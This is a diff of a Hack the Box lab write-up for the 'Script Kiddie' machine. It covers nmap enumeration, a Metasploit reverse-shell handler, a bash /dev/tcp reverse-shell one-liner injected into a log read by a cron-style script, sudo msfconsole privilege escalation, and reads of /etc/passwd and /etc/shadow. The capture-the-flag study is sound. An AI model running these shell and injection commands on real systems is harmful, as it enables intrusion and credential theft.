@@ -1,9 +1,15 @@
+---
+layout: default
+title: Script Kiddie
+parent: Hack the Box Labs
+nav_order: 2
+---
 # Enumeration
 ## NMap Scan
 ```bash
 ┌──(root💀kali)-[/home/ghohst/Documents/HTB/scriptk]
 └─# nmap -sC -sV 10.10.10.226  > nmap.txt
-                                                                               
+
 ┌──(root💀kali)-[/home/ghohst/Documents/HTB/scriptk]
 └─# cat nmap.txt  
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 21:07 MDT
@@ -12,7 +18,7 @@ Host is up (0.061s latency).
 Not shown: 998 closed ports
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
 |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
 |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
@@ -49,12 +55,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
-Kewl webpage on 5000:
-![[Pasted image 20210502211016.png]]
-
 # Exploitation
 ## WerkZeug
-!! Failed WerkZeug Exploitation Attempts
+> Failed WerkZeug Exploitation Attempts
 Werkzeug stands out - did some recon and found the following articles/references:
 Werkzeug httpd 0.16.1
 https://snyk.io/vuln/pip:werkzeug
@@ -153,7 +156,7 @@ Exploit target:
 
 msf6 exploit(multi/handler) > exploit
 
-[*] Started reverse TCP handler on 10.10.14.111:8989 
+[*] Started reverse TCP handler on 10.10.14.111:8989
 ```
 
 Upload malicious template to website and generate (using 'victim' machine's IP)
@@ -162,7 +165,7 @@ Achieve reverse shell, find out 'who we are'
 ```bash
 msf6 exploit(multi/handler) > exploit
 
-[*] Started reverse TCP handler on 10.10.14.111:8989 
+[*] Started reverse TCP handler on 10.10.14.111:8989
 [*] Command shell session 1 opened (10.10.14.111:8989 -> 10.10.10.226:52530) at 2021-05-03 22:47:36 -0600
 
 whoami
@@ -182,7 +185,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 kid@scriptkiddie:~/html$ whoami
 whoami
 kid
-kid@scriptkiddie:~/html$ 
+kid@scriptkiddie:~/html$
 ```
 
 Some initial poking around on the machine, we see 2 users; kid and pwd.
@@ -192,7 +195,7 @@ cat /etc/passwd | grep 'home'
 syslog:x:104:110::/home/syslog:/usr/sbin/nologin
 kid:x:1000:1000:kid:/home/kid:/bin/bash
 pwn:x:1001:1001::/home/pwn:/bin/bash
-kid@scriptkiddie:~/logs$ 
+kid@scriptkiddie:~/logs$
 ```
 
 Hold on to this for additional review:
@@ -209,13 +212,13 @@ cat $log | cut -d' ' -f3- | sort -u | while read ip; do
 done
 
 if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
-kid@scriptkiddie:/home/pwn$ 
+kid@scriptkiddie:/home/pwn$
 ```
 
 Explanation of what we're seeing. cat $log, is reading input from /home/kid/logs/hackers file (which our current user has access to). cut -d ' ' will count each space (' ') as the end of a field, and -f3- will output the 3rd field and anything after it (e.g. cutting out everything before the second space).
 
 
-I see this example in home/kid/html/hackers (the method for initiating a reverse shell), I just need to get this into /home/kid/logs/hackers, so that scanlosers.sh does its 'cat $log' read, thus initiating the reverse shell, as user 'pwn'. 
+I see this example in home/kid/html/hackers (the method for initiating a reverse shell), I just need to get this into /home/kid/logs/hackers, so that scanlosers.sh does its 'cat $log' read, thus initiating the reverse shell, as user 'pwn'.
 ```
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.16/4545 0>&1' #
 ```
@@ -242,7 +245,7 @@ Matching Defaults entries for pwn on scriptkiddie:
 
 User pwn may run the following commands on scriptkiddie:
     (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
-pwn@scriptkiddie:~$ 
+pwn@scriptkiddie:~$
 ```
 
 Since we're essentially an escalated shell from here, we just cat root/root.txt for the final flag.
@@ -253,9 +256,4 @@ I did, also, cat /etc/shadow so I can smash the user passwords if I wanted to. I
 msf6 > cat /etc/shadow
 stty: 'standard input': Inappropriate ioctl for device
 [*] exec: cat /etc/shadow
-
- - clipped -
-root:$6$RO4wVQ99999:7:::
-kid:$6$t9Jp99999:7:::
-pwn:$6$Ci5SpF8qatWsg9:7:::
-```bash
+```
